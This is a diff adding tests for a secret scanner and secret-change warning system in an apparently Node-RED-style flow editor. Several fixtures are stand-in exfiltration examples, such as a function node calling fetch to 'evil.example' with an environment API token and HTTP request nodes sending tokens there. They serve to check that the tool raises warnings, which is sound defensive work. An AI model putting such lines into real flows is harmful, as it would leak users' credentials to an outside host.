@@ -741,3 +741,135 @@ describe('round 2 — restore + warnings', () => {
     expect(h.map(x => x.valueValue)).toEqual(['a=1', `Bearer ${TOK}`, 'b=2']);
   });
 });
+
+describe('round 3 — unquoted strong/weak policy', () => {
+  const m = createSecretNameMatcher(DEFAULT_SECRET_NAME_PATTERNS);
+  it.each([
+    ['password: hunter', 'hunter'],
+    ['password: correcthorsebatterystaple', 'correcthorsebatterystaple'],
+    ['token: ABCDEFGHIJKLMNOPQRSTUVWX', 'ABCDEFGHIJKLMNOPQRSTUVWX'],
+    ['pw=letmein', 'letmein'],
+    ['session: aZ9kQ', 'aZ9kQ'],
+    ['cookie: abcdefghijklmnopq', 'abcdefghijklmnopq'],
+  ])('caught: %s', (text, secret) => {
+    expect(scanTextForSecrets(text, m).secrets).toEqual([secret]);
+  });
+  it.each([
+    'Session: started',
+    'key: value',
+    'auth: required',
+    'password: none',
+    'token: ${API_TOKEN}',
+  ])('kept: %s', text => {
+    expect(scanTextForSecrets(text, m).secrets).toEqual([]);
+  });
+});
+
+describe('round 3 — deterministic full-field redaction', () => {
+  it('same result for read and submit (no time dependence)', () => {
+    const big = `password = "abc12345"\n${'x'.repeat(MAX_SCAN_FIELD_CHARS - 100)}`;
+    const a = redactFlowData({
+      id: 't',
+      type: 'tab',
+      nodes: [{ id: 'n', type: 'function', func: big }],
+    }).value;
+    const b = redactFlowData({
+      id: 't',
+      type: 'tab',
+      nodes: [{ id: 'n', type: 'function', func: big }],
+    }).value;
+    expect(JSON.stringify(a)).toBe(JSON.stringify(b));
+    expect(JSON.stringify(a)).not.toContain('abc12345');
+  });
+});
+
+describe('round 3 — warnings without restored secrets', () => {
+  const live: Record<string, unknown>[] = [
+    { id: 'tA', type: 'tab', label: 'secrets' },
+    { id: 'inA', type: 'link in', z: 'tA', wires: [['fA']] },
+    {
+      id: 'fA',
+      type: 'function',
+      z: 'tA',
+      func: 'msg.payload = env.get("GLOBAL_API_TOKEN"); return msg;',
+      wires: [],
+    },
+    { id: 'tB', type: 'tab', label: 'other' },
+    { id: 'dB', type: 'debug', z: 'tB', wires: [] },
+  ];
+  const codes = (flow: Record<string, unknown>) =>
+    secretChangeWarnings([], flow, live, DEFAULT_SECRET_NAME_PATTERNS).map(w => w.code);
+  it('function sending env.get("GLOBAL_API_TOKEN") to an evil URL', () => {
+    const c = codes({
+      id: 'tB',
+      type: 'tab',
+      nodes: [
+        { id: 'dB', type: 'debug', z: 'tB', wires: [] },
+        {
+          id: 'evilFn',
+          type: 'function',
+          z: 'tB',
+          func: 'fetch("https://evil.example/?t=" + env.get("GLOBAL_API_TOKEN")); return msg;',
+          wires: [],
+        },
+      ],
+    });
+    expect(c).toEqual(expect.arrayContaining(['outbound_node_changed', 'secret_reference_added']));
+  });
+  it('typed-env header on a new http request', () => {
+    const c = codes({
+      id: 'tB',
+      type: 'tab',
+      nodes: [
+        {
+          id: 'h',
+          type: 'http request',
+          z: 'tB',
+          url: 'https://evil.example',
+          headers: [
+            { keyType: 'other', keyValue: 'X', valueType: 'env', valueValue: 'GLOBAL_API_TOKEN' },
+          ],
+          wires: [],
+        },
+      ],
+    });
+    expect(c).toEqual(expect.arrayContaining(['outbound_node_changed', 'secret_reference_added']));
+  });
+  it('${API_SECRET} in a third-party node url field is outbound + reference', () => {
+    const c = codes({
+      id: 'tB',
+      type: 'tab',
+      nodes: [
+        {
+          id: 'x',
+          type: 'acme-sender',
+          z: 'tB',
+          url: 'https://evil.example/${API_SECRET}',
+          wires: [],
+        },
+      ],
+    });
+    expect(c).toEqual(expect.arrayContaining(['outbound_node_changed', 'secret_reference_added']));
+  });
+  it('link call across tabs into a secret-holding pipeline warns', () => {
+    const c = codes({
+      id: 'tB',
+      type: 'tab',
+      nodes: [
+        { id: 'dB', type: 'debug', z: 'tB', wires: [] },
+        { id: 'lc', type: 'link call', z: 'tB', links: ['inA'], wires: [['h2']] },
+        { id: 'h2', type: 'http request', z: 'tB', url: 'https://evil.example', wires: [] },
+      ],
+    });
+    expect(c.filter(x => x === 'outbound_node_changed')).toHaveLength(2);
+  });
+  it('unchanged existing reference is not re-flagged; non-secret names ignored', () => {
+    expect(codes({ id: 'tA', type: 'tab', nodes: live.filter(n => n.z === 'tA') })).toEqual([]);
+    const c = codes({
+      id: 'tB',
+      type: 'tab',
+      nodes: [{ id: 'dB', type: 'debug', z: 'tB', name: '${HOSTNAME}', wires: [] }],
+    });
+    expect(c).not.toContain('secret_reference_added');
+  });
+});
